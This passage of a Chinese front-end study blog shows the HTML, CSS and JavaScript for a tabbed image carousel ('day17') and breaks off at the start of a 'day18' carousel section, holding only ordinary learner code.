class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>day17 选项卡套轮播图<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        *&#123;</span><br><span class="line"><span class="css">            <span class="attribute">margin</span>:<span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">list-style</span>: none;</span></span><br><span class="line">        &#125;</span><br><span class="line">        .content&#123;</span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">800px</span>;</span></span><br><span class="line"><span class="css">            <span class="comment">/* box-shadow: 0 0 2px 0 red; */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="css">            <span class="attribute">left</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">top</span>: <span class="number">100px</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">        .nav&#123;</span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>:<span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.192</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">            <span class="attribute">z-index</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">color</span>:<span class="built_in">rgba</span>(<span class="number">245</span>, <span class="number">245</span>, <span class="number">245</span>, <span class="number">0.747</span>);</span></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.nav</span>&gt;<span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">133px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="css">            <span class="attribute">padding</span>:<span class="number">40px</span> <span class="number">10px</span>;</span></span><br><span class="line"><span class="css">            <span class="comment">/* line-height: 130px; */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.589</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="css">            <span class="attribute">z-index</span>: <span class="number">20</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">transition</span>: .<span class="number">8s</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.nav</span>&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.637</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line">        .content .img_contain&#123;</span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">            <span class="comment">/* box-shadow: 0 0 2px 0 blue; */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: none;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.img_contain</span>&gt;<span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">            <span class="attribute">opacity</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">transition</span>:<span class="number">0.8s</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/1.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">        &#125;<span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/2.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">        &#125;<span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">3</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/3.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">        &#125;<span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">3</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/4.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">        &#125;<span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">3</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/5.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">        &#125;<span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">3</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">3</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/6.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">        &#125;<span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">4</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/7.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">        &#125;<span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">4</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">2</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/8.jpg</span>) no-repeat center/cover;</span></span><br><span class="line"><span class="css">        &#125;<span class="selector-class">.img_contain</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">4</span>)&gt;<span class="selector-tag">li</span><span class="selector-pseudo">:nth-of-type</span>(<span class="number">3</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">./img/9.jpg</span>) no-repeat center/cover;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="selector-tag">div</span>&gt;<span class="selector-tag">ol</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">150px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="css">            <span class="attribute">left</span>: <span class="number">350px</span>;<span class="attribute">bottom</span>:<span class="number">20px</span>;</span></span><br><span class="line"><span class="css">            <span class="comment">/* color:white; */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="css">            <span class="attribute">justify-content</span>: space-around;</span></span><br><span class="line"><span class="css">            <span class="comment">/* display需要与justify-content一起使用，发挥效果 */</span></span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-tag">ol</span>&gt;<span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.233</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">        .cls&#123;</span><br><span class="line"><span class="css">            <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.74</span>);</span></span><br><span class="line"><span class="css">            <span class="attribute">border-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 静态页面 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 存放选项卡轮播图的容器 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- 选项卡 --&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span>集美<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span>鬼刀<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span>风景<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- 图片容器 --&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;img_contain&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: block;&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">&quot;opacity: 1;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span> </span><br><span class="line">       <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;img_contain&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">&quot;opacity: 1;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span> </span><br><span class="line">       <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;img_contain&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span> <span class="attr">style</span>=<span class="string">&quot;opacity: 1;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span> </span><br><span class="line">       <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- 分页器小点 --&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!-- 选项卡与轮播图 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">       <span class="comment">//选项卡</span></span></span><br><span class="line"><span class="javascript">       <span class="keyword">var</span> o_nav=<span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;nav&quot;</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">       <span class="keyword">var</span> nav_li=o_nav.getElementsByTagName(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">       <span class="keyword">var</span> img=<span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;img_contain&quot;</span>);</span></span><br><span class="line"><span class="javascript">       <span class="keyword">var</span> ool=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;ol&quot;</span>)[<span class="number">0</span>];<span class="comment">//这里假设每个选项卡都是3张照片，如果不同，就需要在onclick中再次get ol中的li进行统计</span></span></span><br><span class="line"><span class="javascript">       <span class="keyword">var</span> timer;</span></span><br><span class="line"><span class="javascript">       <span class="keyword">var</span> img_index=<span class="number">0</span>;<span class="comment">//这里必须赋值，否则最后面编写初始第一个轮播效果时会报img_index undefined错误</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">       <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;nav_li.length;i++)&#123; <span class="comment">//0,1,2</span></span></span><br><span class="line"><span class="javascript">            nav_li[i].index=i; <span class="comment">//这里必须要定义index属性，后面需要用到触发源this.index</span></span></span><br><span class="line"><span class="javascript">            nav_li[i].onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 两个层级，选项卡用block和none区分，图片用opacity区分</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;img.length;j++)&#123;</span></span><br><span class="line"><span class="javascript">                    img[j].style.display=<span class="string">&quot;none&quot;</span>;</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                img[<span class="built_in">this</span>.index].style.display=<span class="string">&quot;block&quot;</span>;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 这里的this.index相当于触发源.index，即存储i数值的index</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//定时器轮播图</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//每次点击新的选项卡后轮播图都是从头开始</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> img_li=img[<span class="built_in">this</span>.index].getElementsByTagName(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">                <span class="comment">//利用this这样就不需要在点击事件之前就要var变量，this由触发源触发，onclick本质是当点击事件发生时才会加载这里的var变量，It is a good idea！</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> ol_li=ool.getElementsByTagName(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">                <span class="comment">//对一个contain选项卡中的三张图片进行初始化</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">for</span>(<span class="keyword">var</span> k=<span class="number">0</span>;k&lt;ool.length;k++)&#123;</span></span><br><span class="line">                    img_li[k].style.opacity=0;</span><br><span class="line"><span class="javascript">                    ol_li[k].className=<span class="string">&quot;&quot;</span>;</span></span><br><span class="line">                &#125;</span><br><span class="line">                img_li[0].style.opacity=1;</span><br><span class="line"><span class="javascript">                ol_li[<span class="number">0</span>].style.background=<span class="string">&quot;cls&quot;</span>;</span></span><br><span class="line">                </span><br><span class="line"><span class="javascript">            <span class="comment">//轮播图</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">clearInterval</span>(timer);<span class="comment">//清除上一个选项卡触发的timer</span></span></span><br><span class="line">                img_index = 0;</span><br><span class="line"><span class="javascript">                timer=<span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">                    img_index++;</span><br><span class="line">                    if(img_index&gt;=img_li.length)&#123;</span><br><span class="line">                        img_index=0;</span><br><span class="line">                    &#125;</span><br><span class="line"><span class="javascript">                    <span class="comment">//清除样式</span></span></span><br><span class="line"><span class="javascript">                    <span class="keyword">for</span>(<span class="keyword">var</span> p=<span class="number">0</span>;p&lt;img_li.length;p++)&#123;</span></span><br><span class="line">                        img_li[p].style.opacity=0;</span><br><span class="line"><span class="javascript">                        ol_li[p].className=<span class="string">&quot;&quot;</span>;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    img_li[img_index].style.opacity=1;</span><br><span class="line"><span class="javascript">                    ol_li[img_index].className=<span class="string">&quot;cls&quot;</span>;</span></span><br><span class="line">                    </span><br><span class="line">                &#125;, 2000);</span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">//鼠标移入移出效果</span></span></span><br><span class="line"><span class="javascript">                img[<span class="built_in">this</span>.index].onmouseover=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">clearInterval</span>(timer);</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="javascript">                img[<span class="built_in">this</span>.index].onmouseout=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                    timer=<span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"></span><br><span class="line">                       img_index++;</span><br><span class="line">                        if (img_index &gt;= img_li.length) &#123;</span><br><span class="line">                            img_index = 0;</span><br><span class="line">                        &#125;</span><br><span class="line"><span class="javascript">                        <span class="comment">//清除样式</span></span></span><br><span class="line"><span class="javascript">                        <span class="keyword">for</span> (<span class="keyword">var</span> p = <span class="number">0</span>; p &lt; img_li.length; p++) &#123;</span></span><br><span class="line">                            img_li[p].style.opacity = 0;</span><br><span class="line"><span class="javascript">                            ol_li[p].className = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        img_li[img_index].style.opacity = 1;</span><br><span class="line"><span class="javascript">                        ol_li[img_index].style.background = <span class="string">&quot;cls&quot;</span>;</span></span><br><span class="line"></span><br><span class="line">                    &#125;,2000)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">       <span class="comment">//打开页面第一个轮播图效果</span></span></span><br><span class="line"><span class="javascript">       <span class="comment">//封装run</span></span></span><br><span class="line"><span class="javascript">       <span class="keyword">var</span> img_li_0=img[<span class="number">0</span>].getElementsByTagName(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">       <span class="keyword">var</span> ol_li_0=ool.getElementsByTagName(<span class="string">&quot;li&quot;</span>);</span></span><br><span class="line"><span class="javascript">       timer=<span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">           img_index++;</span><br><span class="line">           if(img_index&gt;=img_li_0.length)&#123;</span><br><span class="line">               img_index=0;</span><br><span class="line">           &#125;</span><br><span class="line"><span class="javascript">           <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;img_li_0.length;i++)&#123;</span></span><br><span class="line">               img_li_0[i].style.opacity=0;</span><br><span class="line"><span class="javascript">               ol_li_0[i].className=<span class="string">&quot;&quot;</span>;</span></span><br><span class="line">           &#125;</span><br><span class="line">           img_li_0[img_index].style.opacity=1;</span><br><span class="line"><span class="javascript">           ol_li_0[img_index].className=<span class="string">&quot;cls&quot;</span>;</span></span><br><span class="line">       &#125;,2000);</span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="day18-数组或swiper-轮播"><a href="#day18-数组或swiper-轮播" class="headerlink" title="day18 数组或swiper+轮播"></a>day18 数组或swiper+轮播</h2><h3 id="数组简化轮播图设计"><a href="#数组简化轮播图设计" class="headerlink" title="数组简化轮播图设计"></a>数组简化轮播图设计</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span 